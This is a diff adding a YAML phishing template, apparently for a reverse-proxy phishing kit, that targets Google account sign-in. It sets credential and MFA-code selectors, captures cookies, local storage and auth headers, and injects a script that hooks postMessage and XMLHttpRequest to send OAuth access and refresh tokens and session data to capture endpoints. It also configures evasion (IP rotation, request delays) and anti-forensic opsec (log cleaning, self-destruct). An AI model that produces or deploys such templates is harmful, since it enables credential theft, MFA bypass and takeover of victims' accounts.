@@ -1,0 +1,104 @@
+name: "Gmail Advanced"
+description: "Advanced Gmail phishing template with session persistence and OAuth capture"
+author: "Vantablack Team"
+version: "2.0"
+
+base_domain: "accounts.google.com"
+target_url: "https://accounts.google.com/signin/v2/identifier"
+
+credentials:
+  username_selector: "input[type='email']"
+  password_selector: "input[type='password']"
+  submit_selector: "button[type='button']:contains('Next')"
+
+mfa:
+  enabled: true
+  sms_code_pattern: '(G-\d{6})'
+  email_code_pattern: '(Your Google verification code is |Code: )(\d{6})'
+  app_code_selector: "input[name='totpPin']"
+
+session_capture:
+  cookies: true
+  local_storage: true
+  session_storage: true
+  headers:
+    - "Authorization"
+    - "X-Google-AuthToken"
+    - "User-Agent"
+
+injection_points:
+  - selector: "body"
+    position: "beforeend"
+    script: |
+      <script>
+        // Advanced Gmail session capture
+        (function() {
+          // Intercept OAuth tokens
+          const originalPostMessage = window.postMessage;
+          window.postMessage = function(data, targetOrigin, transfer) {
+            if (data && data.type === 'oauth') {
+              fetch('/_capture/oauth', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                  tokens: data,
+                  origin: targetOrigin,
+                  timestamp: new Date().toISOString()
+                })
+              });
+            }
+            return originalPostMessage.apply(this, arguments);
+          };
+
+          // Capture all authentication events
+          document.addEventListener('click', function(e) {
+            if (e.target.matches('button[aria-label*="Sign"], button[aria-label*="sign"]')) {
+              setTimeout(() => {
+                const authData = {
+                  cookies: document.cookie,
+                  localStorage: JSON.stringify(localStorage),
+                  url: window.location.href
+                };
+                
+                fetch('/_capture/auth', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify(authData)
+                });
+              }, 1000);
+            }
+          });
+
+          // Monitor network requests for tokens
+          const originalXHROpen = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(method, url) {
+            this.addEventListener('load', function() {
+              if (url.includes('/auth') || url.includes('/token')) {
+                try {
+                  const response = JSON.parse(this.responseText);
+                  if (response.access_token || response.refresh_token) {
+                    fetch('/_capture/tokens', {
+                      method: 'POST',
+                      headers: {'Content-Type': 'application/json'},
+                      body: JSON.stringify(response)
+                    });
+                  }
+                } catch (e) {}
+              }
+            });
+            return originalXHROpen.apply(this, arguments);
+          };
+        })();
+      </script>
+
+evasion:
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  referrer_policy: "strict-origin-when-cross-origin"
+  ip_rotation: true
+  request_delay: 500
+
+opsec:
+  log_cleaning: true
+  memory_only_storage: true
+  encrypted_logs: true
+  self_destruct: true
